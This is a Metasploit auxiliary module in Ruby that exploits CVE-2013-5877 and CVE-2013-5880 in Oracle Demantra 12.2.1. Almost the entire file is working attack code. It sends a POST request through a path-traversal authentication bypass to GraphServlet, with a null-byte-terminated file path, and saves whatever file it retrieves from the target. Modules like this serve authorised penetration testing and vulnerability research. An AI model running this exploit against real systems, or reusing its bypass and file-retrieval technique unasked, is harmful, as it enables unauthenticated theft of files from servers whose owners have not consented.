##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Demantra Arbitrary File Retrieval with Authentication Bypass',
      'Description'    => %q{
        This module exploits a file download vulnerability found in Oracle
        Demantra 12.2.1 in combination with an authentication bypass. By
        combining these exposures, an unauthenticated user can retrieve any file
        on the system by referencing the full file path to any file a vulnerable
        machine.
      },
      'References'     =>
        [
          [ 'CVE', '2013-5877'],
          [ 'CVE', '2013-5880'],
          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5877/'],
          [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/']
        ],
      'Author'         =>
        [
          'Oliver Gruskovnjak'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Feb 28 2014"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptBool.new('SSL',   [false, 'Use SSL', false]),
        OptString.new('FILEPATH', [true, 'The name of the file to download', 'c:/windows/win.ini'])
      ])
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    authbypass = "/demantra/common/loginCheck.jsp/../../GraphServlet"

    res = send_request_cgi({
      'uri' => normalize_uri(authbypass),
      'method' => 'POST',
      'encode_params' => false,
      'vars_post' => {
        'filename' => "#{filename}%00"
      }
    })

    if res.nil? or res.body.empty?
      fail_with(Failure::UnexpectedReply, "No content retrieved from: #{ip}")
    end

    if res.code == 404
      print_error("#{rhost}:#{rport} - File not found")
      return
    end

    if res.code == 200
      print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
      fname = File.basename(datastore['FILEPATH'])
      path = store_loot(
        'oracle.demantra',
        'application/octet-stream',
        ip,
        res.body,
        fname)

      print_good("#{ip}:#{rport} - File saved in: #{path}")
    end
  end
end
